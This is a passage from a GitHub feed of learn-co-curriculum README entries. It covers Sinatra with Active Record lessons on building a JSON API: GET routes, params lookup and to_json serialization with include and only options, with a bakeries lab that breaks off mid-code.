class=&#34;language-json&#34;&gt;{&#xA;  &#34;name&#34;: &#34;Lemon Poppyseed Muffin&#34;,&#xA;  &#34;price&#34;: 3,&#xA;  &#34;bakery_id&#34;: 1&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;code&gt;PATCH /bakeries/:id&lt;/code&gt;: updates the name of the bakery in the database, and returns data for the updated bakery as JSON. The request will receive an object like this as params:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-json&#34;&gt;{&#xA;  &#34;name&#34;: &#34;Northwestside Bakery&#34;&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;code&gt;DELETE /baked_goods/:id&lt;/code&gt;: deletes the baked_good from the database.&lt;/p&gt; &#xA;&lt;h2&gt;Resources&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://rubydoc.info/gems/sinatra#routes&#34;&gt;Sinatra Routes&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt;</summary>
  </entry>
  <entry>
    <title>learn-co-curriculum/phase-3-sinatra-with-active-record-get</title>
    <updated>2022-05-30T01:32:15Z</updated>
    <id>tag:github.com,2022-05-30:/learn-co-curriculum/phase-3-sinatra-with-active-record-get</id>
    <link href="https://github.com/learn-co-curriculum/phase-3-sinatra-with-active-record-get" rel="alternate"></link>
    <summary type="html">&lt;p&gt;&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;Sinatra with Active Record: GET Requests&lt;/h1&gt; &#xA;&lt;h2&gt;Learning Goals&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Handle multiple &lt;code&gt;GET&lt;/code&gt; requests in a controller&lt;/li&gt; &#xA; &lt;li&gt;Use the params hash to look up data with Active Record&lt;/li&gt; &#xA; &lt;li&gt;Send a JSON response using data from an Active Record model&lt;/li&gt; &#xA; &lt;li&gt;Use the &lt;code&gt;#to_json&lt;/code&gt; method to serialize JSON data&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Introduction&lt;/h2&gt; &#xA;&lt;p&gt;OK, it&#39;s the moment of truth! Our application is all set up; we&#39;ve reviewed the file structure and talked about how to run the server. Let&#39;s talk about how we can use Sinatra to access data about our models and send that data as a response.&lt;/p&gt; &#xA;&lt;p&gt;Imagine this scenario: you&#39;re given the task of creating a new game review website from scratch. You want a dynamic, highly interactive frontend, so naturally you choose React. You also need to store the data about your users, your games, and the reviews somewhere. Well, it sounds like we need a database for that. Great! We can use Active Record to set up and access data from the database.&lt;/p&gt; &#xA;&lt;p&gt;Here&#39;s the problem though. React can&#39;t communicate directly with the database — for that, you need Active Record and Ruby. Active Record also doesn&#39;t know anything about your React application (and nor should it!). So then how can we connect up our React frontend with the database?&lt;/p&gt; &#xA;&lt;p&gt;Well, it sounds like we need some sort of &lt;strong&gt;interface&lt;/strong&gt; between React and our database. Perhaps some sort of &lt;strong&gt;Application Programming Interface&lt;/strong&gt; (or as you may know it, API). We need a structured way for these two applications to communicate, using a couple things they &lt;strong&gt;do&lt;/strong&gt; have in common: &lt;strong&gt;HTTP&lt;/strong&gt; and &lt;strong&gt;JSON&lt;/strong&gt;.&lt;/p&gt; &#xA;&lt;p&gt;&lt;em&gt;That&lt;/em&gt; is what we&#39;ll be building for the rest of this section: an API (specifically, a JSON API) that will allow us to use Active Record to communicate with a database from a React application — or really, from any application that speaks HTTP!&lt;/p&gt; &#xA;&lt;h2&gt;Setup&lt;/h2&gt; &#xA;&lt;p&gt;We&#39;ll continue building our Sinatra application using the code from the previous lesson. Run these commands to install the dependencies and set up the database:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-console&#34;&gt;$ bundle install&#xA;$ bundle exec rake db:migrate db:seed&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;&lt;strong&gt;Note&lt;/strong&gt;: Running &lt;code&gt;rake db:migrate db:seed&lt;/code&gt; on one line will run the migrations first, then the seed file. It&#39;s a nice way to save a few keystrokes!&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;p&gt;You can view the models in the &lt;code&gt;app/models&lt;/code&gt; directory, and the migrations in the &lt;code&gt;db/migrate&lt;/code&gt; folder. Here&#39;s what the relationships will look like in our ERD:&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://curriculum-content.s3.amazonaws.com/phase-3/active-record-associations-many-to-many/games-reviews-users-erd.png&#34; alt=&#34;Game Reviews ERD&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;Then, run the server with our new Rake task:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-console&#34;&gt;$ bundle exec rake server&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;With that set up, let&#39;s work on getting Sinatra and Active Record working together!&lt;/p&gt; &#xA;&lt;h2&gt;Accessing the Model From the Controller&lt;/h2&gt; &#xA;&lt;p&gt;Imagine we&#39;re building a feature in a React application where we&#39;d like to show our users a list of all the games in the database. From React, we might have code similar to the following to make this request for the data:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-jsx&#34;&gt;function GameList() {&#xA;  const [games, setGames] = useState([]);&#xA;&#xA;  useEffect(() =&amp;gt; {&#xA;    fetch(&#34;http://localhost:9292/games&#34;)&#xA;      .then((r) =&amp;gt; r.json())&#xA;      .then((games) =&amp;gt; setGames(games));&#xA;  }, []);&#xA;&#xA;  return (&#xA;    &amp;lt;section&amp;gt;&#xA;      {games.map((game) =&amp;gt; (&#xA;        &amp;lt;GameItem key={game.id} game={game} /&amp;gt;&#xA;      ))}&#xA;    &amp;lt;/section&amp;gt;&#xA;  );&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;It&#39;s now our job to set up the server so that when a GET request is made to &lt;code&gt;/games&lt;/code&gt;, we return an array of all the games in our database in JSON format. Let&#39;s set up that code in our controller:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-rb&#34;&gt;class ApplicationController &amp;lt; Sinatra::Base&#xA;&#xA;  get &#39;/games&#39; do&#xA;    # get all the games from the database&#xA;    # return a JSON response with an array of all the game data&#xA;  end&#xA;&#xA;end&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;How do we get all the games from the database? Thankfully for us, Active Record makes it simple:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-rb&#34;&gt;Game.all&#xA;# =&amp;gt; [#&amp;lt;Game&amp;gt;, #&amp;lt;Game&amp;gt;, #&amp;lt;Game&amp;gt;]&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;We can also use Active Record&#39;s &lt;code&gt;#to_json&lt;/code&gt; method to convert this list of Active Record objects to a JSON-formatted string. All together, in our controller, here&#39;s how that would look:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-rb&#34;&gt;class ApplicationController &amp;lt; Sinatra::Base&#xA;&#xA;  get &#39;/games&#39; do&#xA;    # get all the games from the database&#xA;    games = Game.all&#xA;    # return a JSON response with an array of all the game data&#xA;    games.to_json&#xA;  end&#xA;&#xA;end&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Now head over to the browser, and visit the newly-created &lt;code&gt;/games&lt;/code&gt; endpoint at &lt;a href=&#34;http://localhost:9292/games&#34;&gt;http://localhost:9292/games&lt;/a&gt;. You should see a response with a JSON-formatted array of all the games from the database:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-json&#34;&gt;[&#xA;  {&#xA;    &#34;id&#34;: 1,&#xA;    &#34;title&#34;: &#34;Banjo-Kazooie: Grunty&#39;s Revenge&#34;,&#xA;    &#34;genre&#34;: &#34;Real-time strategy&#34;,&#xA;    &#34;platform&#34;: &#34;Nintendo DSi&#34;,&#xA;    &#34;price&#34;: 46,&#xA;    &#34;created_at&#34;: &#34;2021-07-19T21:55:24.266Z&#34;,&#xA;    &#34;updated_at&#34;: &#34;2021-07-19T21:55:24.266Z&#34;&#xA;  },&#xA;  {&#xA;    &#34;id&#34;: 2,&#xA;    &#34;title&#34;: &#34;The Witcher 2: Assassins of Kings&#34;,&#xA;    &#34;genre&#34;: &#34;Text adventure&#34;,&#xA;    &#34;platform&#34;: &#34;Game Boy Advance&#34;,&#xA;    &#34;price&#34;: 49,&#xA;    &#34;created_at&#34;: &#34;2021-07-19T21:55:24.298Z&#34;,&#xA;    &#34;updated_at&#34;: &#34;2021-07-19T21:55:24.298Z&#34;&#xA;  },&#xA;  ...&#xA;]&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Awesome!&lt;/p&gt; &#xA;&lt;p&gt;You also have a lot of control over how this data is returned by using Active Record. For example, you could sort the games by title instead of the default sort order:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-rb&#34;&gt;  get &#39;/games&#39; do&#xA;    games = Game.all.order(:title)&#xA;    games.to_json&#xA;  end&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Or just return the first 10 games:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-rb&#34;&gt;  get &#39;/games&#39; do&#xA;    games = Game.all.order(:title).limit(10)&#xA;    games.to_json&#xA;  end&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Now that you have full control over how the server handles the response, you have the freedom to design your API as you see fit — just think about what kind of data you need for your frontend application.&lt;/p&gt; &#xA;&lt;p&gt;Let&#39;s make one more small adjustment to the controller. By default, Sinatra sets a &lt;a href=&#34;https://developer.mozilla.org/en-US/docs/Glossary/Response_header&#34;&gt;response header&lt;/a&gt; with the &lt;code&gt;Content-Type: text/html&lt;/code&gt;, since in general, web servers are used to send HTML content to browsers. Our server, however, will be used to send JSON data, as you&#39;ve seen above. We can indicate this by changing the response header for all our routes by adding this to the controller:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-rb&#34;&gt;class ApplicationController &amp;lt; Sinatra::Base&#xA;&#xA;  # Add this line to set the Content-Type header for all responses&#xA;  set :default_content_type, &#39;application/json&#39;&#xA;&#xA;  get &#39;/games&#39; do&#xA;    games = Game.all.order(:title).limit(10)&#xA;    games.to_json&#xA;  end&#xA;&#xA;end&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Getting One Game Using Params&lt;/h2&gt; &#xA;&lt;p&gt;We&#39;ve got our API set up to handle one feature so far: we can return a list of all the games in the application. Let&#39;s imagine we&#39;re building another frontend feature; this time, we want a component that will just display the details about one specific game, including its associated reviews. Here&#39;s how that component might look:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-jsx&#34;&gt;function GameDetail({ gameId }) {&#xA;  const [game, setGame] = useState(null);&#xA;&#xA;  useEffect(() =&amp;gt; {&#xA;    fetch(`http://localhost:9292/games/${gameId}`)&#xA;      .then((r) =&amp;gt; r.json())&#xA;      .then((game) =&amp;gt; setGame(game));&#xA;  }, [gameId]);&#xA;&#xA;  if (!game) return &amp;lt;h2&amp;gt;Loading game data...&amp;lt;/h2&amp;gt;;&#xA;&#xA;  return (&#xA;    &amp;lt;div&amp;gt;&#xA;      &amp;lt;h2&amp;gt;{game.title}&amp;lt;/h2&amp;gt;&#xA;      &amp;lt;p&amp;gt;Genre: {game.genre}&amp;lt;/p&amp;gt;&#xA;      &amp;lt;h4&amp;gt;Reviews&amp;lt;/h4&amp;gt;&#xA;      {game.reviews.map((review) =&amp;gt; (&#xA;        &amp;lt;div&amp;gt;&#xA;          &amp;lt;h5&amp;gt;{review.user.name}&amp;lt;/h5&amp;gt;&#xA;          &amp;lt;p&amp;gt;Score: {review.score}&amp;lt;/p&amp;gt;&#xA;          &amp;lt;p&amp;gt;Comment: {review.comment}&amp;lt;/p&amp;gt;&#xA;        &amp;lt;/div&amp;gt;&#xA;      ))}&#xA;    &amp;lt;/div&amp;gt;&#xA;  );&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;So for this feature, we know our server needs to be able to handle a GET request to return data about a specific game, using the game&#39;s ID to find it in the database. For example, a &lt;code&gt;GET /games/10&lt;/code&gt; request should return the game with the ID of 10 from the database; and a &lt;code&gt;GET /games/29&lt;/code&gt; request should return the game with the ID of 29.&lt;/p&gt; &#xA;&lt;p&gt;Let&#39;s start by adding a &lt;strong&gt;dynamic route&lt;/strong&gt; to the controller to handle any of these requests:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-rb&#34;&gt;class ApplicationController &amp;lt; Sinatra::Base&#xA;  set :default_content_type, &#39;application/json&#39;&#xA;&#xA;  get &#39;/games&#39; do&#xA;    games = Game.all.order(:title).limit(10)&#xA;    games.to_json&#xA;  end&#xA;&#xA;  # use the :id syntax to create a dynamic route&#xA;  get &#39;/games/:id&#39; do&#xA;    # look up the game in the database using its ID&#xA;    # send a JSON-formatted response of the game data&#xA;  end&#xA;&#xA;end&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;As we saw earlier, we can access data from the dynamic portion of the URL by using the &lt;strong&gt;params hash&lt;/strong&gt;. For example, if we make a GET request to &lt;code&gt;/games/10&lt;/code&gt;, the params hash would look like this:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-rb&#34;&gt;{ &#34;id&#34; =&amp;gt; &#34;10&#34; }&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;With that in mind, what Active Record method could we use to look up a game with a specific ID? Either &lt;a href=&#34;https://api.rubyonrails.org/v6.1.4/classes/ActiveRecord/FinderMethods.html#method-i-find&#34;&gt;&lt;code&gt;.find&lt;/code&gt;&lt;/a&gt; or &lt;a href=&#34;https://api.rubyonrails.org/v6.1.4/classes/ActiveRecord/FinderMethods.html#method-i-find_by&#34;&gt;&lt;code&gt;.find_by&lt;/code&gt;&lt;/a&gt; would do the trick. Let&#39;s give it a shot:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-rb&#34;&gt;  get &#39;/games/:id&#39; do&#xA;    # look up the game in the database using its ID&#xA;    game = Game.find(params[:id])&#xA;    # send a JSON-formatted response of the game data&#xA;    game.to_json&#xA;  end&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;With this code in place in the controller, try accessing the data about one game in the browser at &lt;a href=&#34;http://localhost:9292/games/1&#34;&gt;http://localhost:9292/games/1&lt;/a&gt;. You should see an object like this in the response:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-json&#34;&gt;{&#xA;  &#34;id&#34;: 1,&#xA;  &#34;title&#34;: &#34;Banjo-Kazooie: Grunty&#39;s Revenge&#34;,&#xA;  &#34;genre&#34;: &#34;Real-time strategy&#34;,&#xA;  &#34;platform&#34;: &#34;Nintendo DSi&#34;,&#xA;  &#34;price&#34;: 46,&#xA;  &#34;created_at&#34;: &#34;2021-07-19T21:55:24.266Z&#34;,&#xA;  &#34;updated_at&#34;: &#34;2021-07-19T21:55:24.266Z&#34;&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Try making requests using other game IDs as well. As long as the ID exists in the database, you&#39;ll get a response.&lt;/p&gt; &#xA;&lt;h3&gt;Accessing Associated Data&lt;/h3&gt; &#xA;&lt;p&gt;Right now, our server is returning information about the game, but how can we also access data about its associated models like the users and reviews? We could make another endpoint for the user and review data, and make additional requests from the frontend, but that might get messy. It would be more efficient to return this data together along with the game data in just one single response.&lt;/p&gt; &#xA;&lt;p&gt;Let&#39;s take a look at the JSON being returned from the server. How does this Ruby code:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-rb&#34;&gt;game = Game.find(params[:id])&#xA;game.to_json&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;...turn into this JSON object?&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-json&#34;&gt;{&#xA;  &#34;id&#34;: 1,&#xA;  &#34;title&#34;: &#34;Banjo-Kazooie: Grunty&#39;s Revenge&#34;,&#xA;  &#34;genre&#34;: &#34;Real-time strategy&#34;,&#xA;  &#34;platform&#34;: &#34;Nintendo DSi&#34;,&#xA;  &#34;price&#34;: 46,&#xA;  &#34;created_at&#34;: &#34;2021-07-19T21:55:24.266Z&#34;,&#xA;  &#34;updated_at&#34;: &#34;2021-07-19T21:55:24.266Z&#34;&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;When we&#39;re using the &lt;code&gt;#to_json&lt;/code&gt; method, Active Record &lt;a href=&#34;https://api.rubyonrails.org/classes/ActiveModel/Serializers/JSON.html#method-i-as_json&#34;&gt;serializes&lt;/a&gt; (converts from one format to another) the Active Record object into a JSON object by getting a list of the model&#39;s attributes based on the column names defined in the database table associated with the model.&lt;/p&gt; &#xA;&lt;p&gt;Under the hood, the &lt;code&gt;#to_json&lt;/code&gt; method calls the &lt;a href=&#34;https://api.rubyonrails.org/classes/ActiveModel/Serializers/JSON.html#method-i-as_json&#34;&gt;&lt;code&gt;#as_json&lt;/code&gt;&lt;/a&gt; method to generate a hash before converting it to a JSON string. Looking at the documentation for &lt;a href=&#34;https://api.rubyonrails.org/classes/ActiveModel/Serializers/JSON.html#method-i-as_json&#34;&gt;&lt;code&gt;#as_json&lt;/code&gt;&lt;/a&gt;, you&#39;ll notice we can pass some additional options to customize how the object is serialized. To include data about associated models in our JSON, we can pass the &lt;code&gt;include:&lt;/code&gt; option to &lt;code&gt;#to_json&lt;/code&gt;, which will pass it along to &lt;code&gt;#as_json&lt;/code&gt;:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-rb&#34;&gt;  get &#39;/games/:id&#39; do&#xA;    game = Game.find(params[:id])&#xA;&#xA;    # include associated reviews in the JSON response&#xA;    game.to_json(include: :reviews)&#xA;  end&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;This will produce the following JSON structure:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-json&#34;&gt;{&#xA;  &#34;id&#34;: 1,&#xA;  &#34;title&#34;: &#34;Banjo-Kazooie: Grunty&#39;s Revenge&#34;,&#xA;  &#34;genre&#34;: &#34;Real-time strategy&#34;,&#xA;  &#34;platform&#34;: &#34;Nintendo DSi&#34;,&#xA;  &#34;price&#34;: 46,&#xA;  &#34;created_at&#34;: &#34;2021-07-19T21:55:24.266Z&#34;,&#xA;  &#34;updated_at&#34;: &#34;2021-07-19T21:55:24.266Z&#34;,&#xA;  &#34;reviews&#34;: [&#xA;    {&#xA;      &#34;id&#34;: 1,&#xA;      &#34;score&#34;: 9,&#xA;      &#34;comment&#34;: &#34;Qui dolorem dolores occaecati.&#34;,&#xA;      &#34;game_id&#34;: 1,&#xA;      &#34;created_at&#34;: &#34;2021-07-19T21:55:24.292Z&#34;,&#xA;      &#34;updated_at&#34;: &#34;2021-07-19T21:55:24.292Z&#34;,&#xA;      &#34;user_id&#34;: 2&#xA;    },&#xA;    {&#xA;      &#34;id&#34;: 2,&#xA;      &#34;score&#34;: 3,&#xA;      &#34;comment&#34;: &#34;Omnis tempora sequi ut.&#34;,&#xA;      &#34;game_id&#34;: 1,&#xA;      &#34;created_at&#34;: &#34;2021-07-19T21:55:24.295Z&#34;,&#xA;      &#34;updated_at&#34;: &#34;2021-07-19T21:55:24.295Z&#34;,&#xA;      &#34;user_id&#34;: 5&#xA;    }&#xA;  ]&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Note that this only works because our &lt;code&gt;Game&lt;/code&gt; model has the correct associations set up:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-rb&#34;&gt;class Game &amp;lt; ActiveRecord::Base&#xA;  has_many :reviews&#xA;  has_many :users, through: :reviews&#xA;end&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;We can even take it a level further, and include the users associated with each review:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-rb&#34;&gt;  get &#39;/games/:id&#39; do&#xA;    game = Game.find(params[:id])&#xA;&#xA;    # include associated reviews in the JSON response&#xA;    game.to_json(include: { reviews: { include: :user } })&#xA;  end&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-json&#34;&gt;{&#xA;  &#34;id&#34;: 1,&#xA;  &#34;title&#34;: &#34;Banjo-Kazooie: Grunty&#39;s Revenge&#34;,&#xA;  &#34;genre&#34;: &#34;Real-time strategy&#34;,&#xA;  &#34;platform&#34;: &#34;Nintendo DSi&#34;,&#xA;  &#34;price&#34;: 46,&#xA;  &#34;created_at&#34;: &#34;2021-07-19T21:55:24.266Z&#34;,&#xA;  &#34;updated_at&#34;: &#34;2021-07-19T21:55:24.266Z&#34;,&#xA;  &#34;reviews&#34;: [&#xA;    {&#xA;      &#34;id&#34;: 1,&#xA;      &#34;score&#34;: 9,&#xA;      &#34;comment&#34;: &#34;Qui dolorem dolores occaecati.&#34;,&#xA;      &#34;game_id&#34;: 1,&#xA;      &#34;created_at&#34;: &#34;2021-07-19T21:55:24.292Z&#34;,&#xA;      &#34;updated_at&#34;: &#34;2021-07-19T21:55:24.292Z&#34;,&#xA;      &#34;user_id&#34;: 2,&#xA;      &#34;user&#34;: {&#xA;        &#34;id&#34;: 2,&#xA;        &#34;name&#34;: &#34;Miss Landon Boehm&#34;,&#xA;        &#34;created_at&#34;: &#34;2021-07-19T21:55:24.247Z&#34;,&#xA;        &#34;updated_at&#34;: &#34;2021-07-19T21:55:24.247Z&#34;&#xA;      }&#xA;    },&#xA;    {&#xA;      &#34;id&#34;: 2,&#xA;      &#34;score&#34;: 3,&#xA;      &#34;comment&#34;: &#34;Omnis tempora sequi ut.&#34;,&#xA;      &#34;game_id&#34;: 1,&#xA;      &#34;created_at&#34;: &#34;2021-07-19T21:55:24.295Z&#34;,&#xA;      &#34;updated_at&#34;: &#34;2021-07-19T21:55:24.295Z&#34;,&#xA;      &#34;user_id&#34;: 5,&#xA;      &#34;user&#34;: {&#xA;        &#34;id&#34;: 5,&#xA;        &#34;name&#34;: &#34;The Hon. Del Ruecker&#34;,&#xA;        &#34;created_at&#34;: &#34;2021-07-19T21:55:24.252Z&#34;,&#xA;        &#34;updated_at&#34;: &#34;2021-07-19T21:55:24.252Z&#34;&#xA;      }&#xA;    }&#xA;  ]&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;We can also be more selective about which attributes are returned from each model with the &lt;code&gt;only&lt;/code&gt; option:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-rb&#34;&gt;  get &#39;/games/:id&#39; do&#xA;    game = Game.find(params[:id])&#xA;&#xA;    # include associated reviews in the JSON response&#xA;    game.to_json(only: [:id, :title, :genre, :price], include: {&#xA;      reviews: { only: [:comment, :score], include: {&#xA;        user: { only: [:name] }&#xA;      } }&#xA;    })&#xA;  end&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-json&#34;&gt;{&#xA;  &#34;id&#34;: 1,&#xA;  &#34;title&#34;: &#34;Banjo-Kazooie: Grunty&#39;s Revenge&#34;,&#xA;  &#34;genre&#34;: &#34;Real-time strategy&#34;,&#xA;  &#34;price&#34;: 46,&#xA;  &#34;reviews&#34;: [&#xA;    {&#xA;      &#34;score&#34;: 9,&#xA;      &#34;comment&#34;: &#34;Qui dolorem dolores occaecati.&#34;,&#xA;      &#34;user&#34;: {&#xA;        &#34;name&#34;: &#34;Miss Landon Boehm&#34;&#xA;      }&#xA;    },&#xA;    {&#xA;      &#34;score&#34;: 3,&#xA;      &#34;comment&#34;: &#34;Omnis tempora sequi ut.&#34;,&#xA;      &#34;user&#34;: {&#xA;        &#34;name&#34;: &#34;The Hon. Del Ruecker&#34;&#xA;      }&#xA;    }&#xA;  ]&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Needless to say, the &lt;code&gt;#to_json&lt;/code&gt; method has a lot of capabilities! It&#39;s very handy when you need to structure your JSON response in a specific format based on what data is needed on the frontend.&lt;/p&gt; &#xA;&lt;h2&gt;Conclusion&lt;/h2&gt; &#xA;&lt;p&gt;In this lesson, you created your very first web API! You learned how to set up multiple routes to handle different requests based on what kind of data we needed for a frontend application, and used Active Record to serialize the JSON response to include all the data needed. At their most basic levels, almost all web APIs provide a way for clients, like React applications, to interact with a database and gain access to data in a structured way. Thanks to tools like Sinatra and Active Record, setting up this interface is fairly straightforward.&lt;/p&gt; &#xA;&lt;h2&gt;Resources&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://rubydoc.info/gems/sinatra#routes&#34;&gt;Sinatra Routes&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://api.rubyonrails.org/classes/ActiveModel/Serializers/JSON.html#method-i-as_json&#34;&gt;Active Model &lt;code&gt;#as_json&lt;/code&gt; method&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt;</summary>
  </entry>
  <entry>
    <title>learn-co-curriculum/phase-3-sinatra-with-active-record-get-lab</title>
    <updated>2022-05-30T01:32:15Z</updated>
    <id>tag:github.com,2022-05-30:/learn-co-curriculum/phase-3-sinatra-with-active-record-get-lab</id>
    <link href="https://github.com/learn-co-curriculum/phase-3-sinatra-with-active-record-get-lab" rel="alternate"></link>
    <summary type="html">&lt;p&gt;&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;Sinatra with Active Record: GET Requests Lab&lt;/h1&gt; &#xA;&lt;h2&gt;Learning Goals&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Handle multiple &lt;code&gt;GET&lt;/code&gt; requests in a controller&lt;/li&gt; &#xA; &lt;li&gt;Use the params hash to look up data with Active Record&lt;/li&gt; &#xA; &lt;li&gt;Send a JSON response using data from an Active Record model&lt;/li&gt; &#xA; &lt;li&gt;Use the &lt;code&gt;#to_json&lt;/code&gt; method to serialize JSON data&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Setup&lt;/h2&gt; &#xA;&lt;p&gt;In this application, we&#39;ll be working on a JSON API to get a list of bakeries and their baked goods. We have two models, bakeries and baked goods, in a one-to-many relationship. The migrations are already set up. Here&#39;s what the ERD for these tables looks like:&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://curriculum-content.s3.amazonaws.com/phase-3/sinatra-with-active-record-get-lab/bakeries-baked_goods-erd.png&#34; alt=&#34;Bakeries ERD&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;To set up the application, run these commands:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-console&#34;&gt;$ bundle install&#xA;$ bundle exec rake db:migrate db:seed&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;You can run the app and explore your API in the browser by using the custom Rake task:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-console&#34;&gt;$ bundle exec rake server&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Instructions&lt;/h2&gt; &#xA;&lt;p&gt;This is a test-driven lab, so run the tests to get started! You&#39;ll be responsible for building out the associations between the models, and then working on adding routes to the &lt;code&gt;ApplicationController&lt;/code&gt; for the different endpoints described in the test spec.&lt;/p&gt; &#xA;&lt;h3&gt;Models&lt;/h3&gt; &#xA;&lt;p&gt;Update the &lt;code&gt;Bakery&lt;/code&gt; and &lt;code&gt;BakedGood&lt;/code&gt; models to set up the correct associations based on the structure of the tables. Use the &lt;code&gt;belongs_to&lt;/code&gt; and &lt;code&gt;has_many&lt;/code&gt; Active Record macros.&lt;/p&gt; &#xA;&lt;h3&gt;Lab Workflow&lt;/h3&gt; &#xA;&lt;p&gt;After setting up your models, it&#39;s time to work on your routes! Since this is your first lab in Sinatra, here&#39;s a recommendation on how to approach writing routes based on the deliverables below.&lt;/p&gt; &#xA;&lt;p&gt;Let&#39;s work on the first deliverable, defining a route that responds to a &lt;code&gt;GET&lt;/code&gt; request to &lt;code&gt;/bakeries&lt;/code&gt; and returns an array of JSON objects for all bakeries in the database.&lt;/p&gt; &#xA;&lt;p&gt;Start by running the server with &lt;code&gt;bundle exec rake server&lt;/code&gt;. Then, in your browser, visit that endpoint with the server running: &lt;a href=&#34;http://localhost:9292/bakeries&#34;&gt;http://localhost:9292/bakeries&lt;/a&gt;. You should see a helpful error message from Sinatra, like this:&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://curriculum-content.s3.amazonaws.com/phase-3/sinatra-with-active-record-get-lab/sinatra-error-message.png&#34; alt=&#34;Sinatra error message&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;Start by adding that route to your &lt;code&gt;ApplicationController&lt;/code&gt;, like Sinatra suggests:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-rb&#34;&gt;class ApplicationController&#xA;  get &#39;/bakeries&#39; do&#xA;    &#34;Hello World&#34;&#xA;  end&#xA;end&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Then, refresh the browser. No more error message! Next, write out a bit of pseudocode. What do we need to do to solve this deliverable?&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-rb&#34;&gt;class ApplicationController&#xA;  get &#39;/bakeries&#39; do&#xA;    # get all the bakeries from the database&#xA;    # send them back as a JSON array&#xA;  